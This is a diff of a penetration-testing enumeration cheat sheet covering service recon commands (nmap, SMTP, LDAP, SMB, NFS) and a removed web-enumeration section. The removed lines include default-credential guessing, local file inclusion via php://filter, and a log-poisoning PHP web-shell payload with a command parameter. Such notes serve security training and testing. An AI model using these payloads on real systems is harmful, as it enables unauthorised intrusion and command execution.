@@ -8,7 +8,7 @@
 - [ ] Operating system 
 - [ ] FTP or SMB anon log in 
 - [ ] Exploitable services versions (searchsploit, github, google) 
-- [ ] Web enum (see checklist below) 
+- [ ] Web enum (see WebEnumeration.md cheatsheet) 
 - [ ] Brute force any services / log in pages   
 
 [Enumeration Mind Map](https://github.com/theonlykernel/enumeration/wiki)     
@@ -60,7 +60,7 @@ nmap --script <name>    --script-help
 	smtp-user-enum -M VRF -u <user.txt> -t 127.0.0.1   
 	nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 127.0.0.1  
 	
-** Port 389: LDAP**  
+**Port 389: LDAP**  
 	
 	ldapsearch -h 127.0.0.1 -p 389 -x -s base
 **Port 139: SMB** 
@@ -79,59 +79,4 @@ check for unauthenticated login, enum with smbmap
     mkdir /mnt/share   
     sudo mount -t nfs -o v2 127.0.0.1/share /mnt/share -o nolock 
 	
-## Web Enum 
-- [ ] Scan for sub directories and pages   
-- [ ] Log in pages - guess default creds, admin:admin, admin:password   
-- [ ] File upload (what types of files are accepted?, what checks?)   
-- [ ] Intercept HTTP requests with Burp   	
 
-	Reference: [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings)    
-    [Wappanalyzer](https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/), [Foxy Proxy](https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/) and [user agent switcher](https://addons.mozilla.org/en-US/firefox/addon/uaswitcher/) Firefox extensions  
-**Scan for sub directories and pages** 	
-	
-	
-        nmap http scripts     
-	
-        nikto -h http://127.0.0.1:80/     
-	
-        dirb http://127.0.0.1/   (default word list: common.txt)     
-	
-        gobuster dir -u http://127.0.0.1/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -e -k -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp" -z    
-
-
-	
-**Login pages** 
-	
-	Default creds - admin: admin, admin:password, service specific default creds   
-	Register a new user  
-	Brute force log in  
-	SQL injection  
-	
-Local File Include  
-[Local File Inclusion](http://resources.infosecinstitute.com/local-file-inclusion-code-execution/#gref)   
-[Guide to LFI](http://www.securityidiots.com/Web-Pentest/LFI/guide-to-lfi.html)    
-	
-	
-	/etc/passwd, etc.
-	can you include a remote file?
-	?test=php://filter/convert.base64-encode/resource=/filepath  base64 encode /decode  
-Log Poisoning 
-	open: /log/apache2/access.log 
-	send payload as user agent string: <?php system($_GET['cmd']); ?>    
-	/log/apache2/access.log&cmd=id    
-
-	
-[SQL Injection Cheatsheet](https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md) 
-	
-Local File Inclusion 
- 
-	
-	
-	
-	  
-Web vulnerabilities to gain access to the system - paper 
-https://www.exploit-db.com/papers/13017/  
-Bypassing File Upload Restrictions 
-http://www.securityidiots.com/Web-Pentest/hacking-website-by-shell-uploading.html  
-Basic SQLi 
-http://www.securityidiots.com/Web-Pentest/SQL-Injection/Part-1-Basic-of-SQL-for-SQLi.html http://www.securityidiots.com/Web-Pentest/SQL-Injection/Part-2-Basic-of-SQL-for-SQLi.html http://www.securityidiots.com/Web-Pentest/SQL-Injection/Part-3-Basic-of-SQL-for-SQLi.html http://www.sqlinjection.net/login/
